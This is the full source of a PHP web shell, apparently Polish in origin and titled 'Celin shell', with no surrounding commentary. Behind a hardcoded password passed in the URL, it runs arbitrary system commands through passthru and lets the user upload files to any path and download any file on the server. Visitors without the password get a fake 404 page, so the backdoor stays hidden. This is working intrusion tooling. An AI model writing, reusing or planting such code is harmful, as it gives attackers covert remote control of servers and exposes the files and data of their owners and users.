<?php
/*HASLO*/ $dsaoi1j2n12="whimeng2";
$blad_html= 'xxxxx';
session_start();
if(isset($_SESSION['status']) && $_SESSION['status']=='zalogowany') { //user zalogowany
	$result="";
	if(!isset($_POST['cmd'])) $_POST['cmd']=""; //wyswietlenie strony po zalogowaniu
	if(isset($_POST['m']) && $_POST['m']=="download") {
		header('Content-Disposition: attachment; filename='.substr(stripcslashes($_POST['cmd']),(  strrpos( stripcslashes($_POST['cmd']),"\\")  )?( strrpos( stripcslashes($_POST['cmd']),"\\") )+1:0  ));
header('Content-Type: application/x-unknown');
		if (!$fp = fopen(stripcslashes($_POST['cmd']), 'rb')) echo "nie udalo sie otworzyc pliku!\n"; else{
			        flock($fp, 1); echo(fread($fp, filesize(stripcslashes($_POST['cmd'])))); flock($fp, 3); fclose($fp); exit(); }
	}
	else if(isset($_POST['m']) && $_POST['m']=="upload") {
	@$result=move_uploaded_file($_FILES['plik'][tmp_name],stripcslashes($_POST['cmd']).$_FILES['plik']['name'])?'Plik zostal zaladowany.':'Blad.'; //upload
	@$_POST['cmd']="Kopiowanie pliku ".$_FILES['plik'][tmp_name].' pod lokalizacje '.stripcslashes($_POST['cmd']).$_FILES['plik']['name'];}		//upload
	echo '<html><head><title>shell</title></head><body style="background-color: black; color: green; text-align: cente;"><br/>Celin shell<b><br/><br/><br/>';
	echo '<form method="post" enctype="multipart/form-data"><input type="text" name="cmd" value="'.stripcslashes($_POST['cmd']).'"/><input type="submit" value="RUN"/><br/>
	<input size="14" type="file" name="plik"/><br/>
	<select name="m"><option checked="checked" value="passthru">passthru</option><option value="upload">upload</option><option value="download">download</option></select></form><br/>';
	echo '----------------RESULT----------------<br/><br/><pre style="text-align: left">console$ '.stripcslashes($_POST['cmd']).'<br/><textarea rows="20" cols="200">'; 
	if($result=="") passthru(stripcslashes($_POST[cmd])." 2>&1"); else echo $result; echo '</textarea><br/><br/></pre>-------------------------------------------'; //wynik
	echo '</b></body></html>';
	exit;
}
else { //user nie zalogowany
        if(isset($_GET['pass']) && $_GET['pass']==$dsaoi1j2n12) { //podano prawidlowe haslo
                $_SESSION['status']='zalogowany';
                header("Location: http://".$_SERVER['HTTP_HOST']."/".$_SERVER['PHP_SELF']);
                echo "ok zalogowany!";
                exit;
        }
        //nie podano prawidlowego hasla, skrypt udaje ze go wogole tam nie ma
        header("HTTP/1.x 404 Not Found");
	echo $blad_html;
}?>
